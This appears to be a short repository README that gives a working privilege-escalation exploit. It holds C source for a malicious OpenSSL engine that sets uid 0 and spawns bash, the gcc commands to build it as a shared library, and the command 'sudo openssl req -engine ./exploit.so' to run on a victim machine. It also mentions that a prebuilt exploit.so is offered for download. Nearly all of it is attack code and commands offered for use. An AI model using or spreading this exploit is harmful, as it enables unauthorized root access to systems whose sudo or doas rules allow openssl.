# openssl-privilege-escalation
How to get ROOT with openssl

On kali(attacker), create a file called exploit.c with the following content:
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id)
{
  setuid(0); setgid(0);
  system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()

Then execute 2 commands:
gcc -fPIC -o exploit.o -c exploit.c
gcc -shared -o exploit.so -lcrypto exploit.o

Upload exploit.so to the victim machine then run:
sudo openssl req -engine ./exploit.so
(also worked with doas because I have tested it)
I have uploaded the exploit.so, so you can just run the above command without building it
